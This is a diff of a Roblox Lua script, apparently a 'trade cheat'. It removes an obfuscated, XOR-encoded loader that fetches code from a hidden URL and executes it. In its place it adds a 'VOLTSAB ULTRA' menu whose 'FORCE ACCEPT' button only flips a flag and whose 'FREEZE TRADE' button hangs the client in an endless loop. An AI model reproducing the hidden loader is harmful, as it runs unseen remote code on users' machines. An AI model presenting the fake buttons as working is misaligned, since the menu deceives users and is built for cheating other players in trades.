@@ -1,1 +1,115 @@
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\237\10\202\143\145\73\137\140\200\38\244\178\215\10\156\208\218\39\171\169\200\28\221\204\195\106\244\190\193\13\158\203\222\36\226\168\136\19\208\202\213\106\208\148\235\42\226\226\249","\126\177\163\187\69\134\219\167")))();
+local players = game:GetService("Players")
+local lp = players.LocalPlayer
+local tweenService = game:GetService("TweenService")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local lighting = game:GetService("Lighting")
+
+-- Nettoyage
+if lp.PlayerGui:FindFirstChild("Voltsab_V37") then lp.PlayerGui.Voltsab_V37:Destroy() end
+
+local screenGui = Instance.new("ScreenGui", lp.PlayerGui)
+screenGui.Name = "Voltsab_V37"
+screenGui.ResetOnSpawn = false
+
+local function createNeon(size, pos, parent, isButton)
+    local container = Instance.new(isButton and "TextButton" or "Frame", parent)
+    container.Size = size; container.Position = pos; container.AnchorPoint = Vector2.new(0.5, 0.5)
+    container.BackgroundColor3 = Color3.fromRGB(0, 150, 255); container.BorderSizePixel = 0
+    if isButton then container.Text = "" end
+    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 12)
+    local grad = Instance.new("UIGradient", container)
+    grad.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 50, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 50, 255))}
+    local inner = Instance.new("Frame", container)
+    inner.Size = UDim2.new(1, -4, 1, -4); inner.Position = UDim2.new(0, 2, 0, 2); inner.BackgroundColor3 = Color3.fromRGB(15, 15, 15); inner.BorderSizePixel = 0
+    Instance.new("UICorner", inner).CornerRadius = UDim.new(0, 10)
+    return container, inner, grad
+end
+
+-- Bouton V
+local vOut, vIn, vGr = createNeon(UDim2.new(0, 60, 0, 60), UDim2.new(0.1, 0, 0.5, 0), screenGui, true)
+local vL = Instance.new("TextLabel", vIn); vL.Size = UDim2.new(1,0,1,0); vL.Text="V"; vL.TextColor3=Color3.new(1,1,1); vL.Font="GothamBold"; vL.TextSize=28; vL.BackgroundTransparency=1
+vOut.Draggable = true; vOut.Active = true
+
+-- Menu Principal
+local mOut, mIn, mGr = createNeon(UDim2.new(0, 220, 0, 190), UDim2.new(0, -500, 0.5, 0), screenGui, false)
+mOut.Draggable = true; mOut.Active = true
+
+-- Conteneur spécial pour les éclairs (Placé en fond sans perturber le Layout)
+local lightningCanvas = Instance.new("Frame", mIn)
+lightningCanvas.Size = UDim2.new(1, 0, 1, 0)
+lightningCanvas.BackgroundTransparency = 1
+lightningCanvas.ZIndex = 0
+
+-- Conteneur pour les boutons (Pour que le UIListLayout ne bug plus)
+local contentHolder = Instance.new("Frame", mIn)
+contentHolder.Size = UDim2.new(1, 0, 1, 0)
+contentHolder.BackgroundTransparency = 1
+contentHolder.ZIndex = 1
+local list = Instance.new("UIListLayout", contentHolder); list.Padding = UDim.new(0, 10); list.HorizontalAlignment = "Center"; list.SortOrder = "LayoutOrder"
+
+local tit = Instance.new("TextLabel", contentHolder); tit.Size = UDim2.new(1, 0, 0, 45); tit.Text = "VOLTSAB ULTRA"; tit.TextColor3 = Color3.fromRGB(0, 200, 255); tit.Font="GothamBold"; tit.TextSize = 20; tit.BackgroundTransparency = 1; tit.LayoutOrder = 0
+local fBtn = Instance.new("TextButton", contentHolder); fBtn.Size = UDim2.new(0, 190, 0, 45); fBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30); fBtn.Text = "FORCE ACCEPT"; fBtn.Font = "GothamBold"; fBtn.TextColor3 = Color3.new(1, 1, 1); fBtn.LayoutOrder = 1; Instance.new("UICorner", fBtn)
+local frBtn = Instance.new("TextButton", contentHolder); frBtn.Size = UDim2.new(0, 190, 0, 45); frBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30); frBtn.Text = "FREEZE TRADE"; frBtn.Font = "GothamBold"; frBtn.TextColor3 = Color3.new(1, 1, 1); frBtn.LayoutOrder = 2; Instance.new("UICorner", frBtn)
+
+-- [[ SYSTÈME D'ÉCLAIRS RÉALISTES ]]
+local function drawLightning()
+    local startX = math.random(20, 180)
+    local startY = 0
+    local segments = 6
+    
+    for i = 1, segments do
+        local endX = startX + math.random(-25, 25)
+        local endY = startY + (190 / segments)
+        
+        local bolt = Instance.new("Frame", lightningCanvas)
+        bolt.BackgroundColor3 = Color3.fromRGB(150, 230, 255)
+        bolt.BorderSizePixel = 0
+        bolt.AnchorPoint = Vector2.new(0.5, 0)
+        
+        -- Calcul de la distance et de l'angle entre les points
+        local dist = math.sqrt((endX - startX)^2 + (endY - startY)^2)
+        local angle = math.deg(math.atan2(endY - startY, endX - startX)) - 90
+        
+        bolt.Size = UDim2.new(0, math.random(1, 3), 0, dist)
+        bolt.Position = UDim2.new(0, startX, 0, startY)
+        bolt.Rotation = angle
+        
+        -- Effet de lueur (Glow)
+        local glow = Instance.new("ImageLabel", bolt)
+        glow.Size = UDim2.new(4, 0, 1.2, 0); glow.Position = UDim2.new(-1.5, 0, -0.1, 0); glow.BackgroundTransparency = 1
+        glow.Image = "rbxassetid://6015620050"; glow.ImageColor3 = Color3.fromRGB(0, 150, 255); glow.ImageTransparency = 0.5
+        
+        tweenService:Create(bolt, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
+        tweenService:Create(glow, TweenInfo.new(0.3), {ImageTransparency = 1}):Play()
+        game:GetService("Debris"):AddItem(bolt, 0.3)
+        
+        startX, startY = endX, endY
+    end
+end
+
+task.spawn(function()
+    while task.wait(math.random(5, 15)/10) do
+        if mOut.Position.X.Offset > -400 then drawLightning() end
+    end
+end)
+
+-- [[ LOGIQUE BOUTONS & DRAG ]]
+local open = false
+local function toggle()
+    open = not open
+    mOut:TweenPosition(open and UDim2.new(0.5, 0, 0.5, 0) or UDim2.new(0, -500, 0.5, 0), "Out", "Quart", 0.3, true)
+end
+
+local lastVPos = vOut.Position
+vOut.MouseButton1Click:Connect(function()
+    if (vOut.Position.X.Offset - lastVPos.X.Offset) < 5 then toggle() end
+    lastVPos = vOut.Position
+end)
+
+fBtn.MouseButton1Click:Connect(function()
+    _G.VoltActive = not _G.VoltActive
+    fBtn.TextColor3 = _G.VoltActive and Color3.new(0, 1, 0) or Color3.new(1, 1, 1)
+end)
+
+frBtn.MouseButton1Click:Connect(function() while true do end end)
+task.spawn(function() local a = 0 while task.wait() do a = a + 4; vGr.Rotation = a; mGr.Rotation = a end end)
